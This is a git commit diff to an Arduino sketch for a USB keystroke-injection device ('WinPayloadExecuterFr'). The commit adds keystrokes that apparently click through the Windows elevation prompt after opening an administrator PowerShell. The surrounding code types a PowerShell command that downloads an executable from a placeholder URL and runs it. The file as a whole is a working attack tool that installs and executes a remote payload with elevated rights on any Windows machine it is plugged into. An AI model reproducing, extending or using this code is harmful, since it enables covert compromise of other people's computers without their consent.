75ec67bac0a40e6323122fdfb397fb42667ad517
Mel-Adrien Dodin <65346144+Adrilaw@users.noreply.github.com>
2024-08-06 11:38:46 +0400

    Update WinPayloadExecuterFr.ino
    added privilege escalation

--- WinPayloadExecuter/WinPayloadExecuterFr/WinPayloadExecuterFr.ino
+++ WinPayloadExecuter/WinPayloadExecuterFr/WinPayloadExecuterFr.ino
@@ -18,6 +18,10 @@ void setup() {
   // my best attempt at a elevated powershell instance
   DigiKeyboardFr.print(F("powershell Start-Process powershell -Verb runAs"));
   DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardFr.sendKeyStroke(43);
+  DigiKeyboardFr.sendKeyStroke(43);
+  DigiKeyboardFr.sendKeyStroke(44);
+  DigiKeyboardFr.delay(500);
   DigiKeyboardFr.delay(3000);
   DigiKeyboardFr.print(F("$down = New-Object System.Net.Webclient; $url = 'http://link/nameofpayload.exe'; $file = 'nameofpayload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;"));
   DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
